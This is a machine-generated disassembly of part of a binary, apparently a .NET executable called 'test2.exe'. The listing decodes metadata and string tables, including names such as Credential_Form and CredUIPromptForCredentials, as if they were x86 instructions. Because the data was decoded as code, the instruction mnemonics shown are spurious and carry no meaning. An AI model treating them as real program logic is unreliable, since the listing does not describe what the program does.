  4068f3:	00 01                	add    %al,(%ecx)
  4068f5:	00 1d 00 17 00 02    	add    %bl,0x2001700
  4068fb:	00 3a                	add    %bh,(%edx)
  4068fd:	00 19                	add    %bl,(%ecx)
  4068ff:	00 02                	add    %al,(%edx)
  406901:	00 49 00             	add    %cl,0x0(%ecx)
  406904:	1b 00                	sbb    (%eax),%eax
  406906:	02 00                	add    (%eax),%al
  406908:	4a                   	dec    %edx
  406909:	00 1d 00 02 00 4b    	add    %bl,0x4b000200
  40690f:	00 1f                	add    %bl,(%edi)
  406911:	00 02                	add    %al,(%edx)
  406913:	00 4c 00 21          	add    %cl,0x21(%eax,%eax,1)
  406917:	00 02                	add    %al,(%edx)
  406919:	00 4d 00             	add    %cl,0x0(%ebp)
  40691c:	23 00                	and    (%eax),%eax
  40691e:	02 00                	add    (%eax),%al
  406920:	4e                   	dec    %esi
  406921:	00 25 00 02 00 4f    	add    %ah,0x4f000200
  406927:	00 27                	add    %ah,(%edi)
  406929:	00 02                	add    %al,(%edx)
  40692b:	00 56 00             	add    %dl,0x0(%esi)
  40692e:	29 00                	sub    %eax,(%eax)
  406930:	01 00                	add    %eax,(%eax)
  406932:	57                   	push   %edi
  406933:	00 29                	add    %ch,(%ecx)
  406935:	00 01                	add    %al,(%ecx)
  406937:	00 59 00             	add    %bl,0x0(%ecx)
  40693a:	2b 00                	sub    (%eax),%eax
  40693c:	02 00                	add    (%eax),%al
  40693e:	58                   	pop    %eax
  40693f:	00 2b                	add    %ch,(%ebx)
  406941:	00 02                	add    %al,(%edx)
  406943:	00 5a 00             	add    %bl,0x0(%edx)
  406946:	2d 00 01 00 5b       	sub    $0x5b000100,%eax
  40694b:	00 2d 00 01 00 5d    	add    %ch,0x5d000100
  406951:	00 2f                	add    %ch,(%edi)
  406953:	00 02                	add    %al,(%edx)
  406955:	00 5c 00 2f          	add    %bl,0x2f(%eax,%eax,1)
  406959:	00 02                	add    %al,(%edx)
  40695b:	00 5e 00             	add    %bl,0x0(%esi)
  40695e:	31 00                	xor    %eax,(%eax)
  406960:	01 00                	add    %eax,(%eax)
  406962:	5f                   	pop    %edi
  406963:	00 31                	add    %dh,(%ecx)
  406965:	00 02                	add    %al,(%edx)
  406967:	00 60 00             	add    %ah,0x0(%eax)
  40696a:	33 00                	xor    (%eax),%eax
  40696c:	01 00                	add    %eax,(%eax)
  40696e:	61                   	popa
  40696f:	00 33                	add    %dh,(%ebx)
  406971:	00 02                	add    %al,(%edx)
  406973:	00 62 00             	add    %ah,0x0(%edx)
  406976:	35 00 01 00 63       	xor    $0x63000100,%eax
  40697b:	00 35 00 02 00 64    	add    %dh,0x64000200
  406981:	00 37                	add    %dh,(%edi)
  406983:	00 01                	add    %al,(%ecx)
  406985:	00 65 00             	add    %ah,0x0(%ebp)
  406988:	37                   	aaa
  406989:	00 01                	add    %al,(%ecx)
  40698b:	00 67 00             	add    %ah,0x0(%edi)
  40698e:	39 00                	cmp    %eax,(%eax)
  406990:	02 00                	add    (%eax),%al
  406992:	66 00 39             	data16 add %bh,(%ecx)
  406995:	00 02                	add    %al,(%edx)
  406997:	00 68 00             	add    %ch,0x0(%eax)
  40699a:	3b 00                	cmp    (%eax),%eax
  40699c:	01 00                	add    %eax,(%eax)
  40699e:	69 00 3b 00 01 00    	imul   $0x1003b,(%eax),%eax
  4069a4:	6b 00 3d             	imul   $0x3d,(%eax),%eax
  4069a7:	00 02                	add    %al,(%edx)
  4069a9:	00 6a 00             	add    %ch,0x0(%edx)
  4069ac:	3d 00 02 00 6c       	cmp    $0x6c000200,%eax
  4069b1:	00 3f                	add    %bh,(%edi)
  4069b3:	00 01                	add    %al,(%ecx)
  4069b5:	00 6d 00             	add    %ch,0x0(%ebp)
  4069b8:	3f                   	aas
  4069b9:	00 02                	add    %al,(%edx)
  4069bb:	00 6e 00             	add    %ch,0x0(%esi)
  4069be:	41                   	inc    %ecx
  4069bf:	00 01                	add    %al,(%ecx)
  4069c1:	00 6f 00             	add    %ch,0x0(%edi)
  4069c4:	41                   	inc    %ecx
  4069c5:	00 02                	add    %al,(%edx)
  4069c7:	00 70 00             	add    %dh,0x0(%eax)
  4069ca:	43                   	inc    %ebx
  4069cb:	00 01                	add    %al,(%ecx)
  4069cd:	00 71 00             	add    %dh,0x0(%ecx)
  4069d0:	43                   	inc    %ebx
  4069d1:	00 06                	add    %al,(%esi)
  4069d3:	13 3f                	adc    (%edi),%edi
  4069d5:	14 f9                	adc    $0xf9,%al
  4069d7:	02 db                	add    %bl,%bl
  4069d9:	03 ec                	add    %esp,%ebp
  4069db:	03 71 04             	add    0x4(%ecx),%esi
  4069de:	0e                   	push   %cs
  4069df:	05 16 05 1e 05       	add    $0x51e0516,%eax
  4069e4:	62 06                	bound  %eax,(%esi)
  4069e6:	71 06                	jno    0x4069ee
  4069e8:	ad                   	lods   %ds:(%esi),%eax
  4069e9:	06                   	push   %es
  4069ea:	c2 06 04             	ret    $0x406
  4069ed:	01 03                	add    %eax,(%ebx)
  4069ef:	00 d2                	add    %dl,%dl
  4069f1:	01 01                	add    %eax,(%ecx)
  4069f3:	00 04 02             	add    %al,(%edx,%eax,1)
  4069f6:	3f                   	aas
  4069f7:	00 2a                	add    %ch,(%edx)
  4069f9:	07                   	pop    %es
  4069fa:	02 00                	add    (%eax),%al
  4069fc:	00 01                	add    %al,(%ecx)
  4069fe:	4b                   	dec    %ebx
  4069ff:	00 87 07 02 00 04    	add    %al,0x4000207(%edi)
  406a05:	80 00 00             	addb   $0x0,(%eax)
	...
  406a14:	00 00                	add    %al,(%eax)
  406a16:	ed                   	in     (%dx),%eax
  406a17:	12 00                	adc    (%eax),%al
  406a19:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406a24:	00 00                	add    %al,(%eax)
  406a26:	01 00                	add    %eax,(%eax)
  406a28:	07                   	pop    %es
  406a29:	01 00                	add    %eax,(%eax)
  406a2b:	00 00                	add    %al,(%eax)
  406a2d:	00 03                	add    %al,(%ebx)
	...
  406a37:	00 00                	add    %al,(%eax)
  406a39:	00 0a                	add    %cl,(%edx)
  406a3b:	00 2d 01 00 00 00    	add    %ch,0x1
  406a41:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406a4c:	00 00                	add    %al,(%eax)
  406a4e:	01 00                	add    %eax,(%eax)
  406a50:	83 01 00             	addl   $0x0,(%ecx)
  406a53:	00 00                	add    %al,(%eax)
  406a55:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406a60:	00 00                	add    %al,(%eax)
  406a62:	01 00                	add    %eax,(%eax)
  406a64:	10 01                	adc    %al,(%ecx)
  406a66:	00 00                	add    %al,(%eax)
  406a68:	00 00                	add    %al,(%eax)
  406a6a:	04 00                	add    $0x0,%al
	...
  406a74:	00 00                	add    %al,(%eax)
  406a76:	b2 01                	mov    $0x1,%dl
  406a78:	6a 08                	push   $0x8
	...
  406a82:	01 00                	add    %eax,(%eax)
  406a84:	00 00                	add    %al,(%eax)
  406a86:	65 21 00             	and    %eax,%gs:(%eax)
  406a89:	00 03                	add    %al,(%ebx)
  406a8b:	00 02                	add    %al,(%edx)
  406a8d:	00 04 00             	add    %al,(%eax,%eax,1)
  406a90:	02 00                	add    (%eax),%al
  406a92:	05 00 02 00 06       	add    $0x6000200,%eax
  406a97:	00 02                	add    %al,(%edx)
  406a99:	00 0b                	add    %cl,(%ebx)
  406a9b:	00 0a                	add    %cl,(%edx)
  406a9d:	00 0d 00 0c 00 10    	add    %cl,0x10000c00
  406aa3:	00 0f                	add    %cl,(%edi)
  406aa5:	00 13                	add    %dl,(%ebx)
  406aa7:	00 12                	add    %dl,(%edx)
  406aa9:	00 1d 00 d2 02 31    	add    %bl,0x3102d200
  406aaf:	02 6e 07             	add    0x7(%esi),%ch
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%ecx,2)
  406abb:	65 3e 00 74 65 73    	gs add %dh,%ds:0x73(%ebp,%eiz,2)
  406ac1:	74 32                	je     0x406af5
  406ac3:	2e 65 78 65          	cs js,pn 0x406b2c
  406ac7:	00 43 72             	add    %al,0x72(%ebx)
  406aca:	65 64 65 6e          	gs fs outsb %gs:(%esi),(%dx)
  406ace:	74 69                	je     0x406b39
  406ad0:	61                   	popa
  406ad1:	6c                   	insb   (%dx),%es:(%edi)
  406ad2:	5f                   	pop    %edi
  406ad3:	46                   	inc    %esi
  406ad4:	6f                   	outsl  %ds:(%esi),(%dx)
  406ad5:	72 6d                	jb     0x406b44
  406ad7:	00 4d 6f             	add    %cl,0x6f(%ebp)
  406ada:	64 75 6c             	fs jne 0x406b49
  406add:	65 4e                	gs dec %esi
  406adf:	61                   	popa
  406ae0:	6d                   	insl   (%dx),%es:(%edi)
  406ae1:	65 53                	gs push %ebx
  406ae3:	70 61                	jo     0x406b46
  406ae5:	63 65 00             	arpl   %esp,0x0(%ebp)
  406ae8:	43                   	inc    %ebx
  406ae9:	52                   	push   %edx
  406aea:	45                   	inc    %ebp
  406aeb:	44                   	inc    %esp
  406aec:	55                   	push   %ebp
  406aed:	49                   	dec    %ecx
  406aee:	5f                   	pop    %edi
  406aef:	49                   	dec    %ecx
  406af0:	4e                   	dec    %esi
  406af1:	46                   	inc    %esi
  406af2:	4f                   	dec    %edi
  406af3:	00 43 52             	add    %al,0x52(%ebx)
  406af6:	45                   	inc    %ebp
  406af7:	44                   	inc    %esp
  406af8:	55                   	push   %ebp
  406af9:	49                   	dec    %ecx
  406afa:	5f                   	pop    %edi
  406afb:	46                   	inc    %esi
  406afc:	4c                   	dec    %esp
  406afd:	41                   	inc    %ecx
  406afe:	47                   	inc    %edi
  406aff:	53                   	push   %ebx
  406b00:	00 43 72             	add    %al,0x72(%ebx)
  406b03:	65 64 55             	gs fs push %ebp
  406b06:	49                   	dec    %ecx
  406b07:	5f                   	pop    %edi
  406b08:	52                   	push   %edx
  406b09:	65 74 75             	gs je  0x406b81
  406b0c:	72 6e                	jb     0x406b7c
  406b0e:	43                   	inc    %ebx
  406b0f:	6f                   	outsl  %ds:(%esi),(%dx)
  406b10:	64 65 73 00          	fs gs jae 0x406b14
  406b14:	55                   	push   %ebp
  406b15:	73 65                	jae    0x406b7c
  406b17:	72 5f                	jb     0x406b78
  406b19:	50                   	push   %eax
  406b1a:	77 64                	ja     0x406b80
  406b1c:	00 4d 61             	add    %cl,0x61(%ebp)
  406b1f:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  406b26:	65 52                	gs push %edx
  406b28:	61                   	popa
  406b29:	77 55                	ja     0x406b80
  406b2b:	49                   	dec    %ecx
  406b2c:	00 49 6e             	add    %cl,0x6e(%ecx)
  406b2f:	70 75                	jo     0x406ba6
  406b31:	74 5f                	je     0x406b92
  406b33:	42                   	inc    %edx
  406b34:	6f                   	outsl  %ds:(%esi),(%dx)
  406b35:	78 00                	js     0x406b37
  406b37:	43                   	inc    %ebx
  406b38:	68 6f 69 63 65       	push   $0x6563696f
  406b3d:	5f                   	pop    %edi
  406b3e:	42                   	inc    %edx
  406b3f:	6f                   	outsl  %ds:(%esi),(%dx)
  406b40:	78 00                	js     0x406b42
  406b42:	52                   	push   %edx
  406b43:	65 61                	gs popa
  406b45:	64 4b                	fs dec %ebx
  406b47:	65 79 5f             	gs jns 0x406ba9
  406b4a:	42                   	inc    %edx
  406b4b:	6f                   	outsl  %ds:(%esi),(%dx)
  406b4c:	78 00                	js     0x406b4e
  406b4e:	4b                   	dec    %ebx
  406b4f:	65 79 62             	gs jns 0x406bb4
  406b52:	6f                   	outsl  %ds:(%esi),(%dx)
  406b53:	61                   	popa
  406b54:	72 64                	jb     0x406bba
  406b56:	5f                   	pop    %edi
  406b57:	46                   	inc    %esi
  406b58:	6f                   	outsl  %ds:(%esi),(%dx)
  406b59:	72 6d                	jb     0x406bc8
  406b5b:	00 50 72             	add    %dl,0x72(%eax)
  406b5e:	6f                   	outsl  %ds:(%esi),(%dx)
  406b5f:	67 72 65             	addr16 jb 0x406bc7
  406b62:	73 73                	jae    0x406bd7
  406b64:	5f                   	pop    %edi
  406b65:	46                   	inc    %esi
  406b66:	6f                   	outsl  %ds:(%esi),(%dx)
  406b67:	72 6d                	jb     0x406bd6
  406b69:	00 50 72             	add    %dl,0x72(%eax)
  406b6c:	6f                   	outsl  %ds:(%esi),(%dx)
  406b6d:	67 72 65             	addr16 jb 0x406bd5
  406b70:	73 73                	jae    0x406be5
  406b72:	5f                   	pop    %edi
  406b73:	44                   	inc    %esp
  406b74:	61                   	popa
  406b75:	74 61                	je     0x406bd8
  406b77:	00 4d 61             	add    %cl,0x61(%ebp)
  406b7a:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  406b81:	65 55                	gs push %ebp
  406b83:	49                   	dec    %ecx
  406b84:	00 4d 61             	add    %cl,0x61(%ebp)
  406b87:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  406b8e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406b92:	6e                   	outsb  %ds:(%esi),(%dx)
  406b93:	73 6f                	jae    0x406c04
  406b95:	6c                   	insb   (%dx),%es:(%edi)
  406b96:	65 43                	gs inc %ebx
  406b98:	6f                   	outsl  %ds:(%esi),(%dx)
  406b99:	6c                   	insb   (%dx),%es:(%edi)
  406b9a:	6f                   	outsl  %ds:(%esi),(%dx)
  406b9b:	72 50                	jb     0x406bed
  406b9d:	72 6f                	jb     0x406c0e
  406b9f:	78 79                	js     0x406c1a
  406ba1:	00 4d 61             	add    %cl,0x61(%ebp)
  406ba4:	69 6e 41 70 70 49 6e 	imul   $0x6e497070,0x41(%esi),%ebp
  406bab:	74 65                	je     0x406c12
  406bad:	72 66                	jb     0x406c15
  406baf:	61                   	popa
  406bb0:	63 65 00             	arpl   %esp,0x0(%ebp)
  406bb3:	4d                   	dec    %ebp
  406bb4:	61                   	popa
  406bb5:	69 6e 41 70 70 00 6d 	imul   $0x6d007070,0x41(%esi),%ebp
  406bbc:	73 63                	jae    0x406c21
  406bbe:	6f                   	outsl  %ds:(%esi),(%dx)
  406bbf:	72 6c                	jb     0x406c2d
  406bc1:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  406bc8:	65 6d                	gs insl (%dx),%es:(%edi)
  406bca:	00 4f 62             	add    %cl,0x62(%edi)
  406bcd:	6a 65                	push   $0x65
  406bcf:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  406bd3:	61                   	popa
  406bd4:	6c                   	insb   (%dx),%es:(%edi)
  406bd5:	75 65                	jne    0x406c3c
  406bd7:	54                   	push   %esp
  406bd8:	79 70                	jns    0x406c4a
  406bda:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  406bde:	75 6d                	jne    0x406c4d
  406be0:	00 53 79             	add    %dl,0x79(%ebx)
  406be3:	73 74                	jae    0x406c59
  406be5:	65 6d                	gs insl (%dx),%es:(%edi)
  406be7:	2e 4d                	cs dec %ebp
  406be9:	61                   	popa
  406bea:	6e                   	outsb  %ds:(%esi),(%dx)
  406beb:	61                   	popa
  406bec:	67 65 6d             	gs insl (%dx),%es:(%di)
  406bef:	65 6e                	outsb  %gs:(%esi),(%dx)
  406bf1:	74 2e                	je     0x406c21
  406bf3:	41                   	inc    %ecx
  406bf4:	75 74                	jne    0x406c6a
  406bf6:	6f                   	outsl  %ds:(%esi),(%dx)
  406bf7:	6d                   	insl   (%dx),%es:(%edi)
  406bf8:	61                   	popa
  406bf9:	74 69                	je     0x406c64
  406bfb:	6f                   	outsl  %ds:(%esi),(%dx)
  406bfc:	6e                   	outsb  %ds:(%esi),(%dx)
  406bfd:	00 53 79             	add    %dl,0x79(%ebx)
  406c00:	73 74                	jae    0x406c76
  406c02:	65 6d                	gs insl (%dx),%es:(%edi)
  406c04:	2e 4d                	cs dec %ebp
  406c06:	61                   	popa
  406c07:	6e                   	outsb  %ds:(%esi),(%dx)
  406c08:	61                   	popa
  406c09:	67 65 6d             	gs insl (%dx),%es:(%di)
  406c0c:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c0e:	74 2e                	je     0x406c3e
  406c10:	41                   	inc    %ecx
  406c11:	75 74                	jne    0x406c87
  406c13:	6f                   	outsl  %ds:(%esi),(%dx)
  406c14:	6d                   	insl   (%dx),%es:(%edi)
  406c15:	61                   	popa
  406c16:	74 69                	je     0x406c81
  406c18:	6f                   	outsl  %ds:(%esi),(%dx)
  406c19:	6e                   	outsb  %ds:(%esi),(%dx)
  406c1a:	2e 48                	cs dec %eax
  406c1c:	6f                   	outsl  %ds:(%esi),(%dx)
  406c1d:	73 74                	jae    0x406c93
  406c1f:	00 50 53             	add    %dl,0x53(%eax)
  406c22:	48                   	dec    %eax
  406c23:	6f                   	outsl  %ds:(%esi),(%dx)
  406c24:	73 74                	jae    0x406c9a
  406c26:	52                   	push   %edx
  406c27:	61                   	popa
  406c28:	77 55                	ja     0x406c7f
  406c2a:	73 65                	jae    0x406c91
  406c2c:	72 49                	jb     0x406c77
  406c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  406c2f:	74 65                	je     0x406c96
  406c31:	72 66                	jb     0x406c99
  406c33:	61                   	popa
  406c34:	63 65 00             	arpl   %esp,0x0(%ebp)
  406c37:	53                   	push   %ebx
  406c38:	79 73                	jns    0x406cad
  406c3a:	74 65                	je     0x406ca1
  406c3c:	6d                   	insl   (%dx),%es:(%edi)
  406c3d:	2e 57                	cs push %edi
  406c3f:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  406c46:	46                   	inc    %esi
  406c47:	6f                   	outsl  %ds:(%esi),(%dx)
  406c48:	72 6d                	jb     0x406cb7
  406c4a:	73 00                	jae    0x406c4c
  406c4c:	46                   	inc    %esi
  406c4d:	6f                   	outsl  %ds:(%esi),(%dx)
  406c4e:	72 6d                	jb     0x406cbd
  406c50:	00 50 53             	add    %dl,0x53(%eax)
  406c53:	48                   	dec    %eax
  406c54:	6f                   	outsl  %ds:(%esi),(%dx)
  406c55:	73 74                	jae    0x406ccb
  406c57:	55                   	push   %ebp
  406c58:	73 65                	jae    0x406cbf
  406c5a:	72 49                	jb     0x406ca5
  406c5c:	6e                   	outsb  %ds:(%esi),(%dx)
  406c5d:	74 65                	je     0x406cc4
  406c5f:	72 66                	jb     0x406cc7
  406c61:	61                   	popa
  406c62:	63 65 00             	arpl   %esp,0x0(%ebp)
  406c65:	50                   	push   %eax
  406c66:	53                   	push   %ebx
  406c67:	48                   	dec    %eax
  406c68:	6f                   	outsl  %ds:(%esi),(%dx)
  406c69:	73 74                	jae    0x406cdf
  406c6b:	00 53 79             	add    %dl,0x79(%ebx)
  406c6e:	73 74                	jae    0x406ce4
  406c70:	65 6d                	gs insl (%dx),%es:(%edi)
  406c72:	2e 54                	cs push %esp
  406c74:	65 78 74             	gs js  0x406ceb
  406c77:	00 53 74             	add    %dl,0x74(%ebx)
  406c7a:	72 69                	jb     0x406ce5
  406c7c:	6e                   	outsb  %ds:(%esi),(%dx)
  406c7d:	67 42                	addr16 inc %edx
  406c7f:	75 69                	jne    0x406cea
  406c81:	6c                   	insb   (%dx),%es:(%edi)
  406c82:	64 65 72 00          	fs gs jb 0x406c86
  406c86:	43                   	inc    %ebx
  406c87:	72 65                	jb     0x406cee
  406c89:	64 55                	fs push %ebp
  406c8b:	49                   	dec    %ecx
  406c8c:	50                   	push   %eax
  406c8d:	72 6f                	jb     0x406cfe
  406c8f:	6d                   	insl   (%dx),%es:(%edi)
  406c90:	70 74                	jo     0x406d06
  406c92:	46                   	inc    %esi
  406c93:	6f                   	outsl  %ds:(%esi),(%dx)
  406c94:	72 43                	jb     0x406cd9
  406c96:	72 65                	jb     0x406cfd
  406c98:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406c9b:	74 69                	je     0x406d06
  406c9d:	61                   	popa
  406c9e:	6c                   	insb   (%dx),%es:(%edi)
  406c9f:	73 00                	jae    0x406ca1
  406ca1:	50                   	push   %eax
  406ca2:	53                   	push   %ebx
  406ca3:	43                   	inc    %ebx
  406ca4:	72 65                	jb     0x406d0b
  406ca6:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406ca9:	74 69                	je     0x406d14
  406cab:	61                   	popa
  406cac:	6c                   	insb   (%dx),%es:(%edi)
  406cad:	54                   	push   %esp
  406cae:	79 70                	jns    0x406d20
  406cb0:	65 73 00             	gs jae 0x406cb3
  406cb3:	50                   	push   %eax
  406cb4:	53                   	push   %ebx
  406cb5:	43                   	inc    %ebx
  406cb6:	72 65                	jb     0x406d1d
  406cb8:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406cbb:	74 69                	je     0x406d26
  406cbd:	61                   	popa
  406cbe:	6c                   	insb   (%dx),%es:(%edi)
  406cbf:	55                   	push   %ebp
  406cc0:	49                   	dec    %ecx
  406cc1:	4f                   	dec    %edi
  406cc2:	70 74                	jo     0x406d38
  406cc4:	69 6f 6e 73 00 50 72 	imul   $0x72500073,0x6e(%edi),%ebp
  406ccb:	6f                   	outsl  %ds:(%esi),(%dx)
  406ccc:	6d                   	insl   (%dx),%es:(%edi)
  406ccd:	70 74                	jo     0x406d43
  406ccf:	46                   	inc    %esi
  406cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  406cd1:	72 50                	jb     0x406d23
  406cd3:	61                   	popa
  406cd4:	73 73                	jae    0x406d49
  406cd6:	77 6f                	ja     0x406d47
  406cd8:	72 64                	jb     0x406d3e
  406cda:	00 2e                	add    %ch,(%esi)
  406cdc:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  406ce0:	00 63 62             	add    %ah,0x62(%ebx)
  406ce3:	53                   	push   %ebx
  406ce4:	69 7a 65 00 68 77 6e 	imul   $0x6e776800,0x65(%edx),%edi
  406ceb:	64 50                	fs push %eax
  406ced:	61                   	popa
  406cee:	72 65                	jb     0x406d55
  406cf0:	6e                   	outsb  %ds:(%esi),(%dx)
  406cf1:	74 00                	je     0x406cf3
  406cf3:	70 73                	jo     0x406d68
  406cf5:	7a 4d                	jp     0x406d44
  406cf7:	65 73 73             	gs jae 0x406d6d
  406cfa:	61                   	popa
  406cfb:	67 65 54             	addr16 gs push %esp
  406cfe:	65 78 74             	gs js  0x406d75
  406d01:	00 70 73             	add    %dh,0x73(%eax)
  406d04:	7a 43                	jp     0x406d49
  406d06:	61                   	popa
  406d07:	70 74                	jo     0x406d7d
  406d09:	69 6f 6e 54 65 78 74 	imul   $0x74786554,0x6e(%edi),%ebp
  406d10:	00 68 62             	add    %ch,0x62(%eax)
  406d13:	6d                   	insl   (%dx),%es:(%edi)
  406d14:	42                   	inc    %edx
  406d15:	61                   	popa
  406d16:	6e                   	outsb  %ds:(%esi),(%dx)
  406d17:	6e                   	outsb  %ds:(%esi),(%dx)
  406d18:	65 72 00             	gs jb  0x406d1b
  406d1b:	76 61                	jbe    0x406d7e
  406d1d:	6c                   	insb   (%dx),%es:(%edi)
  406d1e:	75 65                	jne    0x406d85
  406d20:	5f                   	pop    %edi
  406d21:	5f                   	pop    %edi
  406d22:	00 49 4e             	add    %cl,0x4e(%ecx)
  406d25:	43                   	inc    %ebx
  406d26:	4f                   	dec    %edi
  406d27:	52                   	push   %edx
  406d28:	52                   	push   %edx
  406d29:	45                   	inc    %ebp
  406d2a:	43                   	inc    %ebx
  406d2b:	54                   	push   %esp
  406d2c:	5f                   	pop    %edi
  406d2d:	50                   	push   %eax
  406d2e:	41                   	inc    %ecx
  406d2f:	53                   	push   %ebx
  406d30:	53                   	push   %ebx
  406d31:	57                   	push   %edi
  406d32:	4f                   	dec    %edi
  406d33:	52                   	push   %edx
  406d34:	44                   	inc    %esp
  406d35:	00 44 4f 5f          	add    %al,0x5f(%edi,%ecx,2)
  406d39:	4e                   	dec    %esi
  406d3a:	4f                   	dec    %edi
  406d3b:	54                   	push   %esp
  406d3c:	5f                   	pop    %edi
  406d3d:	50                   	push   %eax
  406d3e:	45                   	inc    %ebp
  406d3f:	52                   	push   %edx
  406d40:	53                   	push   %ebx
  406d41:	49                   	dec    %ecx
  406d42:	53                   	push   %ebx
  406d43:	54                   	push   %esp
  406d44:	00 52 45             	add    %dl,0x45(%edx)
  406d47:	51                   	push   %ecx
  406d48:	55                   	push   %ebp
  406d49:	45                   	inc    %ebp
  406d4a:	53                   	push   %ebx
  406d4b:	54                   	push   %esp
  406d4c:	5f                   	pop    %edi
  406d4d:	41                   	inc    %ecx
  406d4e:	44                   	inc    %esp
  406d4f:	4d                   	dec    %ebp
  406d50:	49                   	dec    %ecx
  406d51:	4e                   	dec    %esi
  406d52:	49                   	dec    %ecx
  406d53:	53                   	push   %ebx
  406d54:	54                   	push   %esp
  406d55:	52                   	push   %edx
  406d56:	41                   	inc    %ecx
  406d57:	54                   	push   %esp
  406d58:	4f                   	dec    %edi
  406d59:	52                   	push   %edx
  406d5a:	00 45 58             	add    %al,0x58(%ebp)
  406d5d:	43                   	inc    %ebx
  406d5e:	4c                   	dec    %esp
  406d5f:	55                   	push   %ebp
  406d60:	44                   	inc    %esp
  406d61:	45                   	inc    %ebp
  406d62:	5f                   	pop    %edi
  406d63:	43                   	inc    %ebx
  406d64:	45                   	inc    %ebp
  406d65:	52                   	push   %edx
  406d66:	54                   	push   %esp
  406d67:	49                   	dec    %ecx
  406d68:	46                   	inc    %esi
  406d69:	49                   	dec    %ecx
  406d6a:	43                   	inc    %ebx
  406d6b:	41                   	inc    %ecx
  406d6c:	54                   	push   %esp
  406d6d:	45                   	inc    %ebp
  406d6e:	53                   	push   %ebx
  406d6f:	00 52 45             	add    %dl,0x45(%edx)
  406d72:	51                   	push   %ecx
  406d73:	55                   	push   %ebp
  406d74:	49                   	dec    %ecx
  406d75:	52                   	push   %edx
  406d76:	45                   	inc    %ebp
  406d77:	5f                   	pop    %edi
  406d78:	43                   	inc    %ebx
  406d79:	45                   	inc    %ebp
  406d7a:	52                   	push   %edx
  406d7b:	54                   	push   %esp
  406d7c:	49                   	dec    %ecx
  406d7d:	46                   	inc    %esi
  406d7e:	49                   	dec    %ecx
  406d7f:	43                   	inc    %ebx
  406d80:	41                   	inc    %ecx
  406d81:	54                   	push   %esp
  406d82:	45                   	inc    %ebp
  406d83:	00 53 48             	add    %dl,0x48(%ebx)
  406d86:	4f                   	dec    %edi
  406d87:	57                   	push   %edi
  406d88:	5f                   	pop    %edi
  406d89:	53                   	push   %ebx
  406d8a:	41                   	inc    %ecx
  406d8b:	56                   	push   %esi
  406d8c:	45                   	inc    %ebp
  406d8d:	5f                   	pop    %edi
  406d8e:	43                   	inc    %ebx
  406d8f:	48                   	dec    %eax
  406d90:	45                   	inc    %ebp
  406d91:	43                   	inc    %ebx
  406d92:	4b                   	dec    %ebx
  406d93:	5f                   	pop    %edi
  406d94:	42                   	inc    %edx
  406d95:	4f                   	dec    %edi
  406d96:	58                   	pop    %eax
  406d97:	00 41 4c             	add    %al,0x4c(%ecx)
  406d9a:	57                   	push   %edi
  406d9b:	41                   	inc    %ecx
  406d9c:	59                   	pop    %ecx
  406d9d:	53                   	push   %ebx
  406d9e:	5f                   	pop    %edi
  406d9f:	53                   	push   %ebx
  406da0:	48                   	dec    %eax
  406da1:	4f                   	dec    %edi
  406da2:	57                   	push   %edi
  406da3:	5f                   	pop    %edi
  406da4:	55                   	push   %ebp
  406da5:	49                   	dec    %ecx
  406da6:	00 52 45             	add    %dl,0x45(%edx)
  406da9:	51                   	push   %ecx
  406daa:	55                   	push   %ebp
  406dab:	49                   	dec    %ecx
  406dac:	52                   	push   %edx
  406dad:	45                   	inc    %ebp
  406dae:	5f                   	pop    %edi
  406daf:	53                   	push   %ebx
  406db0:	4d                   	dec    %ebp
  406db1:	41                   	inc    %ecx
  406db2:	52                   	push   %edx
  406db3:	54                   	push   %esp
  406db4:	43                   	inc    %ebx
  406db5:	41                   	inc    %ecx
  406db6:	52                   	push   %edx
  406db7:	44                   	inc    %esp
  406db8:	00 50 41             	add    %dl,0x41(%eax)
  406dbb:	53                   	push   %ebx
  406dbc:	53                   	push   %ebx
  406dbd:	57                   	push   %edi
  406dbe:	4f                   	dec    %edi
  406dbf:	52                   	push   %edx
  406dc0:	44                   	inc    %esp
  406dc1:	5f                   	pop    %edi
  406dc2:	4f                   	dec    %edi
  406dc3:	4e                   	dec    %esi
  406dc4:	4c                   	dec    %esp
  406dc5:	59                   	pop    %ecx
  406dc6:	5f                   	pop    %edi
  406dc7:	4f                   	dec    %edi
  406dc8:	4b                   	dec    %ebx
  406dc9:	00 56 41             	add    %dl,0x41(%esi)
  406dcc:	4c                   	dec    %esp
  406dcd:	49                   	dec    %ecx
  406dce:	44                   	inc    %esp
  406dcf:	41                   	inc    %ecx
  406dd0:	54                   	push   %esp
  406dd1:	45                   	inc    %ebp
  406dd2:	5f                   	pop    %edi
  406dd3:	55                   	push   %ebp
  406dd4:	53                   	push   %ebx
  406dd5:	45                   	inc    %ebp
  406dd6:	52                   	push   %edx
  406dd7:	4e                   	dec    %esi
  406dd8:	41                   	inc    %ecx
  406dd9:	4d                   	dec    %ebp
  406dda:	45                   	inc    %ebp
  406ddb:	00 43 4f             	add    %al,0x4f(%ebx)
  406dde:	4d                   	dec    %ebp
  406ddf:	50                   	push   %eax
  406de0:	4c                   	dec    %esp
  406de1:	45                   	inc    %ebp
  406de2:	54                   	push   %esp
  406de3:	45                   	inc    %ebp
  406de4:	5f                   	pop    %edi
  406de5:	55                   	push   %ebp
  406de6:	53                   	push   %ebx
  406de7:	45                   	inc    %ebp
  406de8:	52                   	push   %edx
  406de9:	4e                   	dec    %esi
  406dea:	41                   	inc    %ecx
